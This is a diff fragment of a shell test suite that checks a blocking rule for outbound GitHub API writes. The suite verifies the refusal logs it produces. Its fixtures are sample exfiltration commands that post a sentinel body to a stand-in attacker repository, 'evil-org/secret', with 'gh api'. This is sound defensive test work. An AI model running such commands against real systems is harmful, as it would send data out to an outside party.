+for _v_cmd in "gh api -X POST repos/evil-org/secret/issues -f body=E007VSENTINEL" 'gh api -X POST repos/$O/r/issues -f body=E007VSENTINEL' \
+  "gh api -X POST -f body=E007VSENTINEL" "$E007_V_TP"; do
+  e007_v_run "$E007_V_R" enforce "$_v_cmd"
+  { [ "$E007_D_EXIT" = 2 ] && [ "$E007_D_BLK" = 1 ] && [ "$E007_D_WRN" = 0 ]; } || _v_bad="${_v_bad} a fixture: exit=${E007_D_EXIT} blk+${E007_D_BLK} wrn+${E007_D_WRN};"
+done
+_v_blog="$(e007_v_blk "$E007_V_R")"
+_v_c="$(/usr/bin/jq -cs '[.[] | .evidence // "" | split("cause=") | last] | sort' "$_v_blog" 2>/dev/null)"
+[ "$_v_c" = '["no-path","not-allowlisted","unparseable","unresolvable"]' ] || _v_bad="${_v_bad} cause tokens ${_v_c:-none};"
+[ "$(/usr/bin/jq -rs 'all(.[]; .rule == "BLOCK-EGRESS-007")' "$_v_blog" 2>/dev/null)" = true ] || _v_bad="${_v_bad} a record names another rule;"
+[ "$(/usr/bin/jq -rs '[.[] | select(.evidence == "path=repos/evil-org/secret/issues cause=not-allowlisted")] | length' "$_v_blog" 2>/dev/null)" = 1 ] \
+  || _v_bad="${_v_bad} the not-allowlisted record lost its denied path;"
+[ "$(/usr/bin/jq -rs --arg keys "$E007_V_KEYS" '[.[] | select((.evidence // "") | endswith("cause=unparseable")) | ([(.features // {} | keys), has("hook_build")] | tojson) == $keys] == [true]' "$_v_blog" 2>/dev/null)" = true ] \
+  || _v_bad="${_v_bad} the unparseable record lacks the field set;"
+[ "$(/usr/bin/jq -rs '[.[] | select(((.evidence // "") | endswith("cause=unparseable")) | not) | (has("features") or has("hook_build"))] | any' "$_v_blog" 2>/dev/null)" = false ] \
+  || _v_bad="${_v_bad} a record of another cause carries a feature key;"
+_v_hit="$(e007_v_count E007VSENTINEL "$_v_blog")"; _v_ctl="$(e007_v_count BLOCK-EGRESS-007 "$_v_blog")"
+{ [ "$_v_hit" = 0 ] && [ "$_v_ctl" = 4 ]; } || _v_bad="${_v_bad} sentinel lines=${_v_hit} (want 0) rule-id lines=${_v_ctl} (want 4);"
+if [ -z "$_v_bad" ]; then
+  e007_d_pass "AC-E007-V9: the -007 refusal-record contract — one record per cause, cause token recoverable, path kept, field set on unparseable only, no command text"
+else
+  e007_d_fail "AC-E007-V9: the -007 refusal-record contract" "$_v_bad"
+fi
+
+/bin/rm -rf "$E007_V_BASE"
+
 # ----- Raw network tools (BLOCK-EGRESS-008/009/010/011) -----
 
 echo ""
